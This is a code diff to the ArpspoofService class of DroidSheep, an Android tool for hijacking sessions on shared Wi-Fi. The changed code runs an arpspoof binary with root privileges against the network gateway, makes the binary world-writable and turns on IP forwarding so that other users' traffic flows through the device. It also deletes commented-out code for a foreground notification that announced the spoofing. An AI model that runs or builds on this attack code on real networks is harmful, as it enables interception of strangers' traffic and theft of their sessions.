@@ -2,6 +2,7 @@
  * The arpspoof package containts Software, initially developed by Robboe
  * Clemons, It has been used, changed and published in DroidSheep according the
  * GNU GPL
+ * Changed by Andreas Koch according the GPL in August 2011
  */
 
 /*
@@ -57,17 +58,10 @@ public class ArpspoofService extends IntentService {
 		String localBin = bundle.getString("localBin");
 		String gateway = bundle.getString("gateway");
 		String wifiInterface = bundle.getString("interface");
-		final String command = localBin + " -i " + wifiInterface + " " + gateway;
+		final String command = localBin + " -s 1 -i " + wifiInterface + " " + gateway;
 		
 		SystemHelper.execSUCommand("chmod 777 " + SystemHelper.getARPSpoofBinaryPath(this));
 		SystemHelper.execSUCommand("echo 1 > " + IPV4_FILEPATH);
-
-		//		Notification notification = new Notification(R.drawable.ic_stat_spoofing, "now spoofing: " + gateway, System.currentTimeMillis());
-		//		Intent launchActivity = new Intent(this, SpoofingActivity.class);
-		//		launchActivity.putExtras(bundle);
-		//		PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, launchActivity, 0);
-		//		notification.setLatestEventInfo(this, "spoofing: " + gateway, "tap to open Arpspoof", pendingIntent);
-		//		startForeground(SHOW_SPOOFING, notification);
 
 		PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
 		WifiManager wm = (WifiManager) getSystemService(Context.WIFI_SERVICE);
